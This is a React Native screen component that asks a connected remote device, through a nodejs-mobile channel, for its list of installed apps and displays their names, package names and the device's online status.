import React, { useEffect } from "react";
import { 
    Box,
    StatusBar,
    HStack,
    IconButton,
    Icon,
    Text,
    FlatList, 
    Spinner,
    VStack,
    Spacer,
} from "native-base";
import MaterialCommunityIcons from 'react-native-vector-icons/MaterialCommunityIcons';
import nodejs from 'nodejs-mobile-react-native';

// redux
import { useDispatch, useSelector } from '../../redux/store';
import { setIsLoading, resetInstalledApps } from '../../redux/slices/userInfo'

const InstalledApps = ({navigation,route}) => {
  const dispatch = useDispatch();
  const { deviceId } = route.params;
  const { installedApps, devices, isLoadingData } = useSelector((state) => state.userInfo);

  useEffect(()=>{
    _getInstalledApps();
    dispatch(resetInstalledApps([]))
  },[])

  const _getInstalledApps=()=>{
    const data = {
      to: deviceId,
      action: "getInstalledApps",
      data:""
    };
    const finalData = JSON.stringify(data);
    nodejs.channel.post('cmd',finalData)
    dispatch(setIsLoading(true));
   }
   
  return (
    <>
    <StatusBar translucent backgroundColor={"transparent"} barStyle="light-content" />
    <Box  safeAreaTop  bg={"primary"} />

    <Box flex={1} bg={"primary"} px={'2'} >
    <HStack my="4" alignItems="center" justifyContent={"space-between"} borderBottomWidth="1" borderBottomColor={'secondary.500'} >
      <IconButton 
         onPress={()=>navigation.goBack()}
         icon={<Icon as={MaterialCommunityIcons} name="chevron-left-circle" />} 
         borderRadius="full" 
         _icon={{ color:  "tertiary.500", size: "sm"}} 
         _pressed={{ bg: "tertiary.800:alpha.20"}}            
         />
           <Text fontSize={'20'}  color={"secondary.500"}>Installed Apps</Text>
           <Box flexDirection={'row'} alignItems='flex-end'>
            <Icon as={MaterialCommunityIcons} name="signal" color={devices[deviceId].connected?'success.500':'error.500'} size="5" mr="1"/>
            <Text fontSize={'12'} color={"secondary.500"}>{devices[deviceId].connected?'online':'offline'}</Text>
        </Box>
    </HStack>
    <Box bg="dark.100" borderRadius='5' py="4" px="4" mb='2'>
            <HStack space={3} alignItems={'center'}>
            <Icon as={MaterialCommunityIcons} name="android" color={"tertiary.500"} size="5" mr="1"/>
            <Text noOfLines={1} fontSize={'16'} color={"secondary.500"}>{installedApps.length} apps installed</Text>
            <Spacer/>
            </HStack>
     </Box>
        {isLoadingData&&<Spinner color="secondary.500" />}
    <FlatList 
        data={installedApps} 
        renderItem={({ item }) => 
        <Box bg="dark.100" borderRadius='5' py="4" px="4" mb='2'>
            <HStack flex={1} space={3} alignItems={'center'}>
            <Icon as={MaterialCommunityIcons} name={"android"} color={"success.400"} size="10" mr="1"/>
           <VStack flex={1}>
            <HStack flex={1} justifyContent={"space-between"} >
            <Text noOfLines={1} fontSize={'18'} color={"white"}>{item.appName}</Text>
            </HStack>
            <Text noOfLines={2} fontSize={'12'} color={"secondary.500"}>{item.packageName} </Text>
           </VStack>
            </HStack>
        </Box>
        } 
        keyExtractor={(x,index) => index} 
        />
    </Box>
    </>
    )
};

export default InstalledApps;
  